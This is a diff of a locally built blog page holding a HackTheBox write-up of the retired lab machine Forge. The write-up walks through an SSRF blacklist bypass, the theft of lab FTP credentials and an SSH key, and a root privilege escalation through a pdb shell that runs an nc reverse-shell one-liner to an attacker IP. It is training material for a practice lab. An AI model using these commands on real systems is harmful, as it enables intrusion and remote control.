@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
 
   <meta charset="utf-8" />
 
@@ -36,7 +36,7 @@
     <meta name="twitter:title" content="Forge Hackthebox writeup">
     <meta name="twitter:description" content="detailed writeup for retired machine Forge From Hackthebox
 ">
-    <meta name="twitter:image" content="/media/Forge/start.png">
+    <meta name="twitter:image" content="//localhost:1313/media/Forge/start.png">
   
 
   
@@ -44,8 +44,8 @@
   <meta property="og:title" content="Forge Hackthebox writeup">
   <meta property="og:description" content="detailed writeup for retired machine Forge From Hackthebox
 ">
-  <meta property="og:url" content="/post/forge/">
-  <meta property="og:image" content="/media/Forge/start.png">
+  <meta property="og:url" content="//localhost:1313/post/forge/">
+  <meta property="og:image" content="//localhost:1313/media/Forge/start.png">
 
 
 
@@ -53,7 +53,7 @@
 <meta name="generator" content="Hugo 0.86.1">
 
 
-<link rel="canonical" href="/post/forge/">
+<link rel="canonical" href="//localhost:1313/post/forge/">
 
 <meta name="renderer" content="webkit">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -78,20 +78,20 @@
 <meta name='msapplication-navbutton-color' content="#02b875">
 <meta name="msapplication-TileColor" content="#02b875">
 <meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
-<link rel="icon" href="/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
-<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
-<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
-<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="//localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="//localhost:1313/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="//localhost:1313/icons/icon-152x152.png">
+<link rel="manifest" href="//localhost:1313/manifest.json">
 
 
-<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+<link rel="preload" href="//localhost:1313/styles/main-rendered.min.css" as="style">
 
 
 <link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
-<link rel="preload" href="/images/avatar.gif" as="image">
-<link rel="preload" href="/images/test.jpg" as="image">
+<link rel="preload" href="//localhost:1313/images/avatar.gif" as="image">
+<link rel="preload" href="//localhost:1313/images/test.jpg" as="image">
 
 
 <style>
@@ -99,7 +99,7 @@
     background: rgb(244, 243, 241) url('/images/test.jpg') repeat fixed;
   }
 </style>
-<link rel="stylesheet" href="/styles/main-rendered.min.css">
+<link rel="stylesheet" href="//localhost:1313/styles/main-rendered.min.css">
 
 
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
@@ -139,9 +139,9 @@
     
     
   <header class="site-header">
-  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  <a href="//localhost:1313/"><img class="avatar" src="//localhost:1313/images/avatar.gif" alt="Avatar"></a>
   
-  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  <h2 class="title"><a href="//localhost:1313/">0xMesbaha</a></h2>
   
   <p class="subtitle"></p>
   <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
@@ -159,21 +159,21 @@
           
           
           ">
-          <a href="/">Posts</a>
+          <a href="//localhost:1313/">Posts</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="/tags/">Tags</a>
+          <a href="//localhost:1313/tags/">Tags</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="/about/">About</a>
+          <a href="//localhost:1313/about/">About</a>
         </li>
       
     </ul>
@@ -202,7 +202,7 @@
       <p class="post-meta">@0xMesbaha · Jan 27, 2022 · 5 min read</p>
     </header>
     <article class="post-content"><p>detailed writeup for retired machine Forge From Hackthebox</p>
-<p><img src="/media/Forge/start.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/start.png" alt="image"></p>
 <h2 id="scanning--">Scanning  :</h2>
 <ul>
 <li>basic scanning</li>
@@ -234,19 +234,19 @@
 <ul>
 <li>port 80 : &ldquo;the web application&rdquo;</li>
 </ul>
-<p><img src="/media/Forge/forge_1.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/forge_1.png" alt="image"></p>
 <ul>
 <li>we have some images located at <code>/static/images</code> , knowing that from page source code . so probably image we upload won&rsquo;t be rendered on this page</li>
 </ul>
-<p><img src="/media/Forge/forge_2.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/forge_2.png" alt="image"></p>
 <ul>
 <li>and we have upload an image Function with 2 options either from your machine or form url</li>
 </ul>
-<p><img src="/media/Forge/forge_3.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/forge_3.png" alt="image"></p>
 <ul>
 <li>testing from my machine to upload a .png file and see</li>
 </ul>
-<p><img src="/media/Forge/forge_4.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/forge_4.png" alt="image"></p>
 <ul>
 <li>
 <p>it also accepts any extension and assign a random name to it</p>
@@ -285,13 +285,13 @@ returns :</p>
 <pre><code>admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
 </code></pre><p>add <code>admin.forge.htb</code> to <code>/etc/hosts</code></p>
 <p>trying to access it :</p>
-<p><img src="/media/Forge/forge_5.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/forge_5.png" alt="image"></p>
 <p>so putting things together we will have one conclusion to continue from :</p>
 <p><code>forge.htb</code> can make a valid request to <code>admin.forge.htb</code>  , we can achieve that:</p>
 <p>Back to the upload from url vulnerable Function and trying <code>http://admin.forge.htb</code></p>
 <p>returns the blacklist message , so  <code>forge.htb</code>  seems to Be blocked also.</p>
 <p>trying :  <code>http://admin.forge.HTB</code>   then downloading the page and see contents :</p>
-<p><img src="/media/Forge/forge_6.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/forge_6.png" alt="image"></p>
 <p>so we have the following directories at the <code>admin.forge.htb</code></p>
 <pre><code>/announcements
 /upload
@@ -299,7 +299,7 @@ returns :</p>
 </code></pre><p>Back to the upload from url and requesting</p>
 <pre><code>http://admin.forge.HTB/announcements
 </code></pre><p>downloading the page to see the content we can see :</p>
-<p><img src="/media/Forge/forge_7.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/forge_7.png" alt="image"></p>
 <ul>
 <li>
 <p>so we have credentials : <strong>user:heightofsecurity123!</strong></p>
@@ -327,11 +327,11 @@ returns :</p>
 <li>using the following url and download content :</li>
 </ul>
 <pre><code>http://admin.forge.HTB/upload?u=ftp://user:heightofsecurity123!@127.1/.ssh/id_rsa
-</code></pre><p><img src="/media/Forge/forge_8.png" alt="image"></p>
+</code></pre><p><img src="//localhost:1313/media/Forge/forge_8.png" alt="image"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod <span style="color:#ae81ff">600</span> id_rsa
 ssh -i id_rsa user@10.10.11.111
 </code></pre></div><h3 id="privilege-escalation-">Privilege escalation :</h3>
-<p><img src="/media/Forge/forge_9.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/forge_9.png" alt="image"></p>
 <p>checking permissions :</p>
 <pre><code>-rwxr-xr-x 1 root root 1447 May 31  2021 /opt/remote-manage.py
 </code></pre><p>reading and analyzing  the script :</p>
@@ -377,15 +377,15 @@ ssh -i id_rsa user@10.10.11.111
 <span style="color:#66d9ef">finally</span>:
     quit()
 </code></pre></div><p>if we raise an error it will open  a <code>pdb debugger shell </code> which we can abuse to have a reverse shell as root :</p>
-<p><img src="/media/Forge/forge_10.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/forge_10.png" alt="image"></p>
 <p>the other ssh session to interact with the port listening :</p>
-<p><img src="/media/Forge/forge_11.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/forge_11.png" alt="image"></p>
 <p>raised the error by typing <code>id </code> while it expects a number and get the pdb shell we can now get a reverse shell  :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>/media/Forge/Pdb<span style="color:#f92672">)</span> import os
 <span style="color:#f92672">(</span>/media/Forge/Pdb<span style="color:#f92672">)</span> os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;my_ip&gt; 9999 &gt;/tmp/f&#34;</span><span style="color:#f92672">)</span>
-</code></pre></div><p><img src="/media/Forge/forge_14.png" alt="image"></p>
+</code></pre></div><p><img src="//localhost:1313/media/Forge/forge_14.png" alt="image"></p>
 <p>gain root reverse shell :</p>
-<p><img src="/media/Forge/forge_15.png" alt="image"></p>
+<p><img src="//localhost:1313/media/Forge/forge_15.png" alt="image"></p>
 <h1 id="pwned">Pwned</h1>
 <h3 id="investigation-">investigation :</h3>
 <p>we have at <code>/var/www</code>  the following :</p>
@@ -398,14 +398,14 @@ ssh -i id_rsa user@10.10.11.111
       
       <ul class="post-tags">
         
-          <li><a href="/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
+          <li><a href="//localhost:1313/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
         
-          <li><a href="/tags/ssrf"><span class="tag">SSRF</span></a></li>
+          <li><a href="//localhost:1313/tags/ssrf"><span class="tag">SSRF</span></a></li>
         
       </ul>
       
       <p class="post-copyright">
-        © all rights reserved for 0xMesbaha.
+        © all rights reserved for 0xMesbaha.This post was published <strong>112</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
@@ -454,7 +454,7 @@ ssh -i id_rsa user@10.10.11.111
 
 
 
-<script src="/scripts/index.min.js"></script>
+<script src="//localhost:1313/scripts/index.min.js"></script>
 
 <script>
   if ('serviceWorker' in navigator) {
